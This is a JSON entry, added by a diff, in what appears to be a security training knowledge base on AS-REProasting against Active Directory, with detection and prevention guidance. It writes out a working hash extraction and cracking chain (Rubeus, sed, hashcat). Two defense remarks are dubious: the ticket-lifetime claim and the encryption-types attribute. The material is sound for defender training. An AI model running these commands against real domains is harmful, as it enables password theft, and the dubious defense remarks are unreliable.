@@ -1,0 +1,78 @@
+{
+  "id": "cdsa-m06-asreproasting",
+  "name": "AS-REProasting \u2014 Attack, Detection & Defense",
+  "command": ".\\Rubeus.exe asreproast /outfile:asrep.txt",
+  "description": "AS-REProasting targets accounts with 'Do not require Kerberos preauthentication' enabled, obtaining crackable AS-REP hashes without credentials. Detection: Event 4768 with Pre-Authentication Type 0 and RC4 encryption (0x17). Prevention: enforce preauthentication, 20+ char passwords for affected accounts.",
+  "platform": "windows",
+  "type": "attack-chain",
+  "opsec": "moderate",
+  "category": "Active Directory Defense",
+  "subcategory": "Kerberos Attacks",
+  "certifications": [
+    "CDSA"
+  ],
+  "source": "CDSA Module 06: Windows Attacks & Defense",
+  "tags": [
+    "asreproasting",
+    "kerberos",
+    "pre-authentication",
+    "rubeus",
+    "hashcat",
+    "active-directory",
+    "blue-team"
+  ],
+  "mitre": [
+    "T1558.004"
+  ],
+  "notes": "=== ATTACK ===\n# Step 1: Extract hashes for all accounts with pre-auth disabled\n.\\Rubeus.exe asreproast /outfile:asrep.txt\n\n# Step 2: Fix hash format for hashcat (add '23$' after '$krb5asrep$')\n# Original:  $krb5asrep$anni@eagle.local:...\n# Fixed:     $krb5asrep$23$anni@eagle.local:...\n# (Edit the file manually or with sed)\n\n# Step 3: Crack with hashcat\nsudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force\n  \u2192 18200 = Kerberos 5, etype 23 (RC4), AS-REP\n\n# View cracked password\nsudo cat asrepcrack.txt\n\n=== DETECTION ===\nEvent ID 4768: Kerberos Authentication Ticket Requested\n  \u2192 Pre-Authentication Type = 0 (no pre-auth) \u2192 suspicious\n  \u2192 Ticket Encryption Type = 0x17 (RC4) when tools target weak encryption\n  \u2192 Rubeus defaults to RC4 for AS-REProasting\n  \u2192 Correlate source IP/VLAN against expected user location\n\nHoneypot user criteria:\n  \u2192 Old account (2+ years), old password (not changed recently)\n  \u2192 Must have 'Do not require Kerberos preauthentication' enabled\n  \u2192 Recent logins present (makes it believable)\n  \u2192 Has some privileges assigned (makes it worthwhile to crack)\n  \u2192 Any 4768 for this account = alert\n\n=== PREVENTION ===\n  \u2192 Only enable 'Do not require Kerberos preauthentication' when absolutely needed\n  \u2192 Quarterly review of accounts with this property\n  \u2192 Separate password policy for affected accounts: minimum 20 characters",
+  "examples": [
+    {
+      "label": "Extract AS-REP hashes for all pre-auth disabled accounts",
+      "command": ".\\Rubeus.exe asreproast /outfile:asrep.txt"
+    },
+    {
+      "label": "Crack AS-REP hashes with hashcat (mode 18200)",
+      "command": "sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force"
+    },
+    {
+      "label": "Fix hash format for hashcat (add 23$ after $krb5asrep$)",
+      "command": "sed -i 's/\\$krb5asrep\\$/\\$krb5asrep\\$23\\$/g' asrep.txt"
+    },
+    {
+      "label": "View cracked AS-REP passwords",
+      "command": "cat asrepcrack.txt"
+    }
+  ],
+  "references": [
+    {
+      "title": "HTB Academy - Windows Attacks & Defense",
+      "url": "https://academy.hackthebox.com/module/details/176"
+    },
+    {
+      "title": "Kerberos Pre-Authentication Types (Event 4768)",
+      "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cdsa-m06-kerberoasting",
+      "rel": "prereq",
+      "note": "Kerberoasting \u2014 similar offline hash cracking technique targeting SPN accounts."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Accounts with 'Do not require Kerberos preauthentication' enabled return an AS-REP encrypted with the account's password hash to ANY requester. Because no pre-auth is required, an attacker gets a crackable hash without ever authenticating.",
+    "prerequisites": "Network access to the DC and a target account that has Kerberos pre-authentication disabled. No credentials required.",
+    "impact": "The cleartext password of the affected account after offline cracking.",
+    "detection": "Event 4768 (Kerberos Authentication Ticket Requested) with Pre-Authentication Type = 0 and Ticket Encryption Type 0x17 (RC4, which the tools default to). Correlate the source IP/VLAN against the user's expected location.",
+    "artifacts": "4768 events with pre-auth type 0; an asrep.txt hash dump on the attacker host; Rubeus asreproast execution. A honeypot account with pre-auth disabled (old, believable, some privileges) fires 4768 on any request.",
+    "prevention": "Only enable 'Do not require Kerberos preauthentication' when absolutely necessary; review accounts carrying this flag quarterly; enforce a separate 20+ character password policy for affected accounts.",
+    "sources": [
+      "HTB CDSA M06",
+      "MITRE T1558.004"
+    ],
+    "misconfiguration": "The 'Do Not Require Kerberos Preauthentication' checkbox is enabled on the user account (msDS-SupportedEncryptionTypes or the UAC flag UF_DONT_REQUIRE_PREAUTH = 0x400000). This means the KDC issues an AS-REP with the user's session key encrypted by their password hash \u2014 without demanding proof of identity first.",
+    "vulnerable_config": "# Active Directory user account attribute (via ADUC or ADSI Edit)\n# 'Do not require Kerberos preauthentication' = CHECKED\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $true\n\n# UAC flag value: 0x400000 (4194304)\n# Confirmed with:\nGet-ADUser svc_backup -Properties DoesNotRequirePreAuth",
+    "secure_config": "# Enforce Kerberos pre-authentication (the secure default)\n# In PowerShell:\nSet-ADAccountControl -Identity svc_backup -DoesNotRequirePreAuth $false\n\n# Bulk fix \u2014 find and fix all no-preauth accounts:\nGet-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false\n\n# GPO path (Kerberos policy):\n# Computer Configuration > Windows Settings > Security Settings >\n# Account Policies > Kerberos Policy\n# 'Maximum lifetime for user ticket' should be set (forces preauth implicitly)"
+  }
+}
